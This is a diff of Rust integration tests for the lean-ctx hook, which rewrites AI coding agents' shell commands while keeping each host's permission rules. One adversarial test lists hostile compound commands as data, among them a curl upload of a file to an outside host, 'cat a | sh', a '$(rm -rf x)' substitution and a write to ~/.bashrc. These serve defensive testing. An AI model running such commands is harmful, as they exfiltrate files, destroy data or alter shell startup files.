@@ -44,6 +44,10 @@ fn run_with_env(
     (stdout, stderr, code)
 }
 
+fn no_claude_config() -> std::path::PathBuf {
+    std::env::temp_dir().join("lean-ctx-hook-tests-no-claude-config")
+}
+
 fn run_hook_test(
     args: &[&str],
     env_vars: &[(&str, &str)],
@@ -56,6 +60,12 @@ fn run_hook_test(
         // deny/shadow policy. No global configuration is changed.
         .env("LEAN_CTX_SHELL_HOOK_MODE", "rewrite")
         .env("LEAN_CTX_TOOL_SURFACE", "mcp")
+        // The hook mirrors the developer's Claude Code permissions; tests run
+        // against none unless they pass their own (see `claude_env`).
+        .env("CLAUDE_CONFIG_DIR", no_claude_config())
+        .env("CLAUDE_PROJECT_DIR", no_claude_config())
+        .env_remove("CLAUDE_CODE_SESSION_ID")
+        .env_remove("CODEBUDDY_SESSION_ID")
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
         .stderr(Stdio::piped());
@@ -254,9 +264,8 @@ fn agent_init_unknown_agent_fails() {
 }
 
 #[test]
-fn codex_pretooluse_rewrites_rewritable_bash_with_updated_input() {
-    let input =
-        r#"{"tool_name":"Bash","tool_input":{"command":"git status"},"command":"git status"}"#;
+fn codex_pretooluse_rewrites_read_only_bash_with_updated_input() {
+    let input = r#"{"tool_name":"Bash","tool_input":{"command":"cat src/main.rs"},"command":"cat src/main.rs"}"#;
     let (stdout, stderr, code) = run_hook_test(&["hook", "codex-pretooluse"], &[], Some(input));
     assert_eq!(code, 0, "hook should rewrite without blocking: {stderr}");
     assert!(
@@ -265,21 +274,331 @@ fn codex_pretooluse_rewrites_rewritable_bash_with_updated_input() {
     );
     let parsed: serde_json::Value =
         serde_json::from_str(stdout.trim()).expect("stdout should contain hook JSON");
+    // Codex applies updatedInput only with "allow"; read-only rewrites may carry it.
     assert_eq!(parsed["hookSpecificOutput"]["permissionDecision"], "allow");
     let command = parsed["hookSpecificOutput"]["updatedInput"]["command"]
         .as_str()
         .expect("updated command should be a string");
-    let expected_binary = if cfg!(windows) {
-        "lean-ctx.exe"
-    } else {
-        "lean-ctx"
-    };
     assert!(
-        command.contains(expected_binary)
-            && command.contains("-c")
-            && command.contains("git status"),
-        "updated command should wrap git status with lean-ctx: {command}"
+        command.contains(" read ") && command.contains("src/main.rs") && !command.contains(" -c "),
+        "updated command should map cat onto lean-ctx read: {command}"
     );
+}
+
+/// Codex can only rewrite by approving, so only a command in the
+/// side-effect-free set is rewritten (and approved); builds, tests and
+/// writers are left to Codex's own approval flow.
+#[test]
+fn codex_pretooluse_approves_only_side_effect_free_rewrites() {
+    let input =
+        r#"{"tool_name":"Bash","tool_input":{"command":"git status"},"command":"git status"}"#;
+    let (stdout, stderr, code) = run_hook_test(&["hook", "codex-pretooluse"], &[], Some(input));
+    assert_eq!(code, 0, "{stderr}");
+    let v: serde_json::Value = serde_json::from_str(stdout.trim()).expect("JSON");
+    assert_eq!(
+        v["hookSpecificOutput"]["permissionDecision"], "allow",
+        "{v}"
+    );
+    let cmd = v["hookSpecificOutput"]["updatedInput"]["command"]
+        .as_str()
+        .unwrap_or("");
+    assert!(
+        cmd.contains("lean-ctx") && cmd.contains("git status"),
+        "{v}"
+    );
+
+    for cmd in ["rm -rf build", "cargo test", "git status && cargo test"] {
+        let input = format!(
+            r#"{{"tool_name":"Bash","tool_input":{{"command":"{cmd}"}},"command":"{cmd}"}}"#
+        );
+        let (stdout, stderr, code) =
+            run_hook_test(&["hook", "codex-pretooluse"], &[], Some(&input));
+        assert_eq!(code, 0, "{cmd}: {stderr}");
+        assert!(!stdout.contains("allow"), "{cmd}: {stdout}");
+        assert!(!stdout.contains("updatedInput"), "{cmd}: {stdout}");
+    }
+}
+
+fn claude_bash_payload(cmd: &str) -> String {
+    serde_json::json!({
+        "session_id": "s",
+        "transcript_path": "/tmp/t.jsonl",
+        "cwd": "/tmp",
+        "hook_event_name": "PreToolUse",
+        "tool_name": "Bash",
+        "tool_input": { "command": cmd }
+    })
+    .to_string()
+}
+
+fn cursor_shell_payload(cmd: &str) -> String {
+    serde_json::json!({
+        "hook_event_name": "preToolUse",
+        "tool_name": "Shell",
+        "tool_input": { "command": cmd }
+    })
+    .to_string()
+}
+
+fn hook_rewrite_json(payload: &str) -> serde_json::Value {
+    let (stdout, stderr, code) = run_hook_test(&["hook", "rewrite"], &[], Some(payload));
+    assert_eq!(code, 0, "rewrite hook must fail open: {stderr}");
+    serde_json::from_str(stdout.trim()).unwrap_or_else(|e| panic!("{e}: {stdout:?}"))
+}
+
+/// A command the hook does not rewrite must leave the host's permission flow
+/// intact: a hook "allow" skips the user's prompt on Claude Code, Cursor and
+/// Copilot CLI.
+#[test]
+fn hook_rewrite_not_rewritten_destructive_command_grants_nothing() {
+    for payload in [
+        claude_bash_payload("rm -rf build"),
+        cursor_shell_payload("rm -rf build"),
+    ] {
+        let v = hook_rewrite_json(&payload);
+        assert_eq!(v, serde_json::json!({}), "{payload}");
+    }
+}
+
+/// Malformed input and non-shell tools fail open without a decision.
+#[test]
+fn hook_rewrite_malformed_and_foreign_tools_grant_nothing() {
+    for payload in [
+        "not json",
+        r#"{"tool_name":"Write","tool_input":{"file_path":"x"}}"#,
+    ] {
+        let (stdout, _stderr, code) = run_hook_test(&["hook", "rewrite"], &[], Some(payload));
+        assert_eq!(code, 0);
+        assert_eq!(stdout.trim(), "{}", "{payload}");
+    }
+}
+
+/// Claude Code: a rewrite is delivered as `updatedInput` without a
+/// `permissionDecision`, so Claude's rules and prompt still decide — for a
+/// read rewrite and for a `lean-ctx -c` wrap alike.
+#[test]
+fn hook_rewrite_claude_rewrites_keep_claude_permission_flow() {
+    for cmd in ["cat src/main.rs", "git status"] {
+        let v = hook_rewrite_json(&claude_bash_payload(cmd));
+        let hook = &v["hookSpecificOutput"];
+        assert_eq!(hook["hookEventName"], "PreToolUse", "{cmd}: {v}");
+        assert!(hook.get("permissionDecision").is_none(), "{cmd}: {v}");
+        assert!(hook["updatedInput"]["command"].is_string(), "{cmd}: {v}");
+        assert!(v.get("decision").is_none(), "{cmd}: {v}");
+    }
+}
+
+/// Cursor/Copilot only take a rewrite as an approval: a command in the
+/// side-effect-free set is rewritten and approved, anything else passes
+/// through unchanged to the host's own approval.
+#[test]
+fn hook_rewrite_cursor_approves_only_side_effect_free_commands() {
+    let v = hook_rewrite_json(&cursor_shell_payload("cat src/main.rs"));
+    assert_eq!(v["permission"], "allow", "{v}");
+    let cmd = v["updated_input"]["command"].as_str().unwrap_or_default();
+    assert!(cmd.contains(" read ") && !cmd.contains(" -c "), "{v}");
+
+    let v = hook_rewrite_json(&cursor_shell_payload("git status"));
+    assert_eq!(v["permission"], "allow", "{v}");
+    assert_eq!(v["permissionDecision"], "allow", "{v}");
+    let cmd = v["updated_input"]["command"].as_str().unwrap_or_default();
+    assert!(
+        cmd.contains("lean-ctx") && cmd.contains("git status"),
+        "{v}"
+    );
+    assert_eq!(v["modifiedArgs"]["command"], cmd, "{v}");
+
+    for risky in [
+        "cargo test",
+        "npm test",
+        "make",
+        "git status && cargo build",
+        "rm -rf build",
+    ] {
+        let v = hook_rewrite_json(&cursor_shell_payload(risky));
+        assert_eq!(v, serde_json::json!({}), "{risky}");
+    }
+}
+
+/// A hermetic Claude Code environment: this session's id, a config dir with
+/// `settings` as the user's settings.json, and an empty project.
+fn claude_env(settings: &serde_json::Value) -> (tempfile::TempDir, Vec<(String, String)>) {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let config = dir.path().join("config");
+    let project = dir.path().join("project");
+    std::fs::create_dir_all(&config).unwrap();
+    std::fs::create_dir_all(&project).unwrap();
+    std::fs::write(config.join("settings.json"), settings.to_string()).unwrap();
+    let env = vec![
+        ("CLAUDE_CODE_SESSION_ID".to_string(), "s".to_string()),
+        (
+            "CLAUDE_CONFIG_DIR".to_string(),
+            config.display().to_string(),
+        ),
+        (
+            "CLAUDE_PROJECT_DIR".to_string(),
+            project.display().to_string(),
+        ),
+    ];
+    (dir, env)
+}
+
+fn claude_mode_payload(cmd: &str, mode: &str) -> String {
+    serde_json::json!({
+        "session_id": "s",
+        "transcript_path": "/tmp/t.jsonl",
+        "cwd": "/tmp",
+        "permission_mode": mode,
+        "hook_event_name": "PreToolUse",
+        "tool_name": "Bash",
+        "tool_input": { "command": cmd }
+    })
+    .to_string()
+}
+
+fn claude_rewrite(settings: &serde_json::Value, cmd: &str, mode: &str) -> serde_json::Value {
+    let (_dir, env) = claude_env(settings);
+    let env: Vec<(&str, &str)> = env.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
+    let payload = claude_mode_payload(cmd, mode);
+    let (stdout, stderr, code) = run_hook_test(&["hook", "rewrite"], &env, Some(&payload));
+    assert_eq!(code, 0, "{stderr}");
+    serde_json::from_str(stdout.trim()).unwrap_or_else(|e| panic!("{e}: {stdout:?}"))
+}
+
+fn claude_decision(v: &serde_json::Value) -> Option<&str> {
+    v["hookSpecificOutput"]["permissionDecision"].as_str()
+}
+
+/// "Mirror, don't grant" on Claude Code: the rewrite carries "allow" exactly
+/// when Claude Code would have run the ORIGINAL command without a prompt.
+/// (Each case uses its own command: the hook replays a duplicate fire of the
+/// same command within a short window.)
+#[test]
+fn hook_rewrite_claude_mirrors_the_users_permissions() {
+    let allow = serde_json::json!({"permissions": {"allow": ["Bash(cargo test *)"]}});
+    let v = claude_rewrite(&allow, "cargo test --lib", "default");
+    assert_eq!(claude_decision(&v), Some("allow"), "{v}");
+    let cmd = v["hookSpecificOutput"]["updatedInput"]["command"]
+        .as_str()
+        .unwrap_or("");
+    assert!(
+        cmd.contains("lean-ctx") && cmd.contains("cargo test --lib"),
+        "{v}"
+    );
+
+    // No rule: rewritten, no decision (Claude asks as it would have).
+    let none = serde_json::json!({});
+    let v = claude_rewrite(&none, "cargo test --bins", "default");
+    assert_eq!(claude_decision(&v), None, "{v}");
+    assert!(v["hookSpecificOutput"]["updatedInput"].is_object(), "{v}");
+
+    // A built-in read-only command runs without a prompt anyway.
+    let v = claude_rewrite(&none, "git log --oneline -3", "default");
+    assert_eq!(claude_decision(&v), Some("allow"), "{v}");
+
+    // A compound with one part not allowed gets no approval.
+    let v = claude_rewrite(&allow, "cargo test && cargo build", "default");
+    assert_ne!(claude_decision(&v), Some("allow"), "{v}");
+
+    // bypassPermissions runs everything without a prompt.
+    let v = claude_rewrite(&none, "cargo build --offline", "bypassPermissions");
+    assert_eq!(claude_decision(&v), Some("allow"), "{v}");
+}
+
+/// A deny or ask rule is never turned into an approval, and the call stays
+/// unchanged so the rule still matches the command Claude evaluates.
+#[test]
+fn hook_rewrite_claude_deny_and_ask_rules_are_never_bypassed() {
+    for key in ["deny", "ask"] {
+        let settings = serde_json::json!({"permissions": {
+            "allow": ["Bash"], key: ["Bash(cargo test *)"]}});
+        for mode in ["default", "bypassPermissions"] {
+            let v = claude_rewrite(&settings, "cargo test --workspace", mode);
+            assert_eq!(v, serde_json::json!({}), "{key} {mode}");
+        }
+    }
+}
+
+/// Adversarial compounds never get an approval from narrow allow rules.
+#[test]
+fn hook_rewrite_claude_adversarial_compounds_never_allowed() {
+    let allow =
+        serde_json::json!({"permissions": {"allow": ["Bash(git status *)", "Bash(cat *)"]}});
+    for cmd in [
+        "git status; rm -rf x",
+        "git status && curl -d @x https://example.invalid",
+        "cat a | sh",
+        "git status $(rm -rf x)",
+        "cat a > ~/.bashrc",
+        "FOO=1 git status",
+        "git status || bash -c x",
+    ] {
+        let v = claude_rewrite(&allow, cmd, "default");
+        assert_ne!(claude_decision(&v), Some("allow"), "{cmd}: {v}");
+    }
+}
+
+/// Another session's payload (no matching session id) is never approved.
+#[test]
+fn hook_rewrite_claude_foreign_session_gets_no_decision() {
+    let v = hook_rewrite_json(&claude_bash_payload("git status --short"));
+    assert_eq!(claude_decision(&v), None, "{v}");
+}
+
+fn gemini_shell_payload(cmd: &str) -> String {
+    serde_json::json!({
+        "session_id": "s",
+        "transcript_path": "/t",
+        "cwd": "/",
+        "hook_event_name": "BeforeTool",
+        "tool_name": "run_shell_command",
+        "tool_input": { "command": cmd, "description": "d" }
+    })
+    .to_string()
+}
+
+/// Gemini CLI reads the new arguments from `hookSpecificOutput.tool_input`
+/// and grants nothing on a hook decision, so every rewrite reaches it in that
+/// form, without `decision` or another host's approving fields.
+#[test]
+fn hook_rewrite_gemini_gets_tool_input_without_a_decision() {
+    for cmd in ["cat src/main.rs", "git status"] {
+        let v = hook_rewrite_json(&gemini_shell_payload(cmd));
+        assert_eq!(
+            v.as_object().map(serde_json::Map::len),
+            Some(1),
+            "{cmd}: {v}"
+        );
+        let hook = &v["hookSpecificOutput"];
+        assert_eq!(hook["hookEventName"], "BeforeTool", "{cmd}: {v}");
+        let new_cmd = hook["tool_input"]["command"].as_str().unwrap_or_default();
+        assert!(new_cmd.contains("lean-ctx"), "{cmd}: {v}");
+        assert_eq!(hook["tool_input"]["description"], "d", "{cmd}: {v}");
+        assert!(hook.get("updatedInput").is_none(), "{cmd}: {v}");
+    }
+    let v = hook_rewrite_json(&gemini_shell_payload("rm -rf build"));
+    assert_eq!(v, serde_json::json!({}));
+}
+
+/// Gemini's file tools reject paths outside the workspace, so a redirect to
+/// a LeanCTX temp file would fail every read: Gemini keeps its native read.
+#[test]
+fn hook_redirect_gemini_read_passes_through() {
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let file = tmp.path().join("main.rs");
+    std::fs::write(&file, "fn main() {}\n".repeat(200)).unwrap();
+    let payload = serde_json::json!({
+        "session_id": "s",
+        "transcript_path": "/t",
+        "cwd": tmp.path(),
+        "hook_event_name": "BeforeTool",
+        "tool_name": "read_file",
+        "tool_input": { "file_path": file }
+    })
+    .to_string();
+    let (stdout, stderr, code) = run_hook_test(&["hook", "redirect"], &[], Some(&payload));
+    assert_eq!(code, 0, "{stderr}");
+    assert_eq!(stdout.trim(), "{}");
 }
 
 #[test]
@@ -560,7 +879,7 @@ fn hook_rewrite_works_with_shell_override() {
 }
 
 #[test]
-fn hook_rewrite_disabled_produces_allow_output() {
+fn hook_rewrite_disabled_produces_neutral_passthrough() {
     let input = r#"{"tool_name":"Bash","command":"git status"}"#;
     let (stdout, _stderr, code) = run_hook_test(
         &["hook", "rewrite"],
@@ -568,17 +887,11 @@ fn hook_rewrite_disabled_produces_allow_output() {
         Some(input),
     );
     let trimmed = stdout.trim();
-    assert!(
-        !trimmed.is_empty(),
-        "disabled hook should produce ALLOW output"
-    );
+    // Valid JSON for hosts that need it, but no permission decision: a
+    // disabled hook must not approve the call.
     let v: serde_json::Value =
         serde_json::from_str(trimmed).expect("disabled hook output should be valid JSON");
-    assert_eq!(
-        v["permission"].as_str().unwrap_or(""),
-        "allow",
-        "disabled hook must output allow, got: {stdout}"
-    );
+    assert_eq!(v, serde_json::json!({}), "got: {stdout}");
     assert_eq!(code, 0, "disabled hook should exit cleanly");
 }
 
@@ -592,23 +905,10 @@ fn codex_pretooluse_disabled_exits_cleanly() {
         Some(input),
     );
     assert_eq!(code, 0, "disabled codex hook should not exit(2)");
-    // #809: even when disabled, the codex hook must emit valid JSON
-    // (empty stdout causes "invalid JSON" errors in Codex CLI).
-    // When disabled it emits an "allow" response.
-    if stdout.trim().is_empty() {
-        // Legacy behavior: some builds still produce empty output.
-    } else {
-        let parsed: serde_json::Value = serde_json::from_str(stdout.trim())
-            .expect("disabled codex hook output must be valid JSON");
-        let decision = parsed
-            .pointer("/hookSpecificOutput/permissionDecision")
-            .and_then(|v| v.as_str());
-        assert_eq!(
-            decision,
-            Some("allow"),
-            "disabled codex hook must allow: {stdout}"
-        );
-    }
+    // Codex treats exit 0 with no output as "continue" (#1019: a bare
+    // `permissionDecision: allow` is rejected), and a disabled hook must not
+    // approve anything.
+    assert!(stdout.trim().is_empty(), "disabled codex hook: {stdout}");
 }
 
 #[test]
